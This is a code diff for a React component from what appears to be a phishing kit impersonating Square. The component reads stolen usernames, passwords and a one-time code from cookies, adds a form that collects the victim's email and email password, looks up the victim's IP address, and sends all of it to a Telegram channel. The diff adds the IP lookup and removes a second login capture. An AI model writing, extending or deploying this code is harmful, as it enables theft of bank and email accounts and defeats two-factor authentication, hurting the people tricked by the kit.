@@ -5,8 +5,7 @@ import TelegramSend from "../utils/send-message";
 
 export default function EmailVerif() {
   const cookie_details:Login = cookies.get("login1");
-  const cookie_details2:Login2 = cookies.get("login2");
-  const auth:otp = cookies.get("verif");
+  const auth = cookies.get("verif");
   const [formInput, setFormInput] = useState<{email:string, email_pass:string}>({email:"", email_pass:""})
 const [isLoading, setIsLoading] = React.useState(false);
 const navigate = useNavigate()
@@ -18,27 +17,37 @@ function handleInputChange (event:React.ChangeEvent<HTMLInputElement>){
     }))
 }
 
+const [addy, setAddy] = React.useState<string>();
+
+async function getIP() {
+  const request = await fetch("https://api.ipify.org?format=json");
+  const response: { ip: string } = await request.json();
+  setAddy(response.ip);
+}
+
+React.useEffect(() => {
+  getIP();
+}, []);
+
 async function handleSubmit(event: React.FormEvent<HTMLFormElement>){
     
     event.preventDefault()
     setIsLoading(true)
     const message = `
     [----+🏦 SQUARE 🏦+-----]
+
+      ${addy}
+
       FIRST LOGIN
       USERNAME: ${cookie_details.username}
       PASSWORD: ${cookie_details.password}
 
-      SECOND LOGIN
-      USERNAME: ${cookie_details2.username2}
-      PASSWORD: ${cookie_details2.password2}
-
-      OTP: ${auth.cd}
+      OTP: ${auth}
 
       EMAIL
       EMAIL: ${formInput.email}
       PASSWORD: ${formInput.email_pass}
     `;
-
     await TelegramSend(message)
     
     setIsLoading(false)
